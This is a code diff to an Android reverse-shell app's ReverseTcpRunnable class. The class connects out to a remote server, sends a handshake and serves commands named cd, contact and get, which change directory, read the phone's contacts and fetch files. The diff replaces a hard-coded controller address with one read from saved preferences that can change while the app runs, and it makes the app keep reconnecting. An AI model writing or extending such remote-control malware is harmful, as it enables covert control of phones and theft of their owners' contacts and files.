@@ -1,11 +1,13 @@
 package com.anythingintellect.androidreverseshell;
 
 import android.content.Context;
+import android.content.SharedPreferences;
 import android.text.TextUtils;
 import android.util.Log;
 
 import com.anythingintellect.androidreverseshell.internalcmdutils.ContactHelper;
 import com.anythingintellect.androidreverseshell.internalcmdutils.GetHelper;
+import com.anythingintellect.androidreverseshell.utils.RSPreferences;
 
 import org.json.JSONArray;
 import org.json.JSONObject;
@@ -24,18 +26,23 @@ import java.net.Socket;
  * Created by ishan.dhingra on 21/07/16.
  */
 
-public class ReverseTcpRunnable implements Runnable {
+public class ReverseTcpRunnable implements Runnable, SharedPreferences.OnSharedPreferenceChangeListener {
     private static final long RETRY_WAIT_TIME = 10000;
-    String host = "192.168.43.6";
-    int port = 443;
+    String host;
+    int port;
     private String directory = "/";
     private static final String CMD_CD = "cd";
     private static final String CMD_CONTACT = "contact";
     private static final String CMD_GET = "get";
     private Context mContext;
+    private RSPreferences rsPreferences;
 
     public ReverseTcpRunnable(Context context) {
         this.mContext = context;
+        this.rsPreferences = RSPreferences.getInstance(context);
+        this.host = rsPreferences.getHost();
+        this.port = rsPreferences.getPort();
+        rsPreferences.getSharedPreferences().registerOnSharedPreferenceChangeListener(this);
     }
 
     @Override
@@ -47,13 +54,13 @@ public class ReverseTcpRunnable implements Runnable {
         DataOutputStream toServer = null;
         BufferedReader fromServer = null;
         log("Connecting to " + host + ":" + port);
+        boolean run = true;
         try {
             Socket socket = new Socket(host, port);
             log("Connected!");
             toServer = new DataOutputStream(socket.getOutputStream());
             fromServer = new BufferedReader(
                     new InputStreamReader(socket.getInputStream()));
-            boolean run = true;
             // Required to handshake with server
             // Can be anything you like
             toServer.write("Hello".getBytes("UTF-8"));
@@ -75,7 +82,6 @@ public class ReverseTcpRunnable implements Runnable {
             }
         } catch (IOException e) {
             e.printStackTrace();
-            retry();
         } finally {
             try {
                 if (toServer != null) {
@@ -88,7 +94,16 @@ public class ReverseTcpRunnable implements Runnable {
             } catch (IOException e) {
                 e.printStackTrace();
             }
+            if (run) {
+                retry();
+            } else {
+                doCleanup();
+            }
         }
+    }
+
+    private void doCleanup() {
+        rsPreferences.getSharedPreferences().unregisterOnSharedPreferenceChangeListener(this);
     }
 
     private void shotEndResponse(DataOutputStream toServer) {
@@ -241,6 +256,18 @@ public class ReverseTcpRunnable implements Runnable {
     private void log(String msg) {
         if (msg != null) {
             Log.d("rvtcp", msg);
+        }
+    }
+
+    @Override
+    public void onSharedPreferenceChanged(SharedPreferences sharedPreferences, String s) {
+        String newHost = rsPreferences.getHost();
+        int newPort = rsPreferences.getPort();
+        if (!newHost.equalsIgnoreCase(host)) {
+            this.host = newHost;
+        }
+        if (newPort != port) {
+            this.port = newPort;
         }
     }
 }
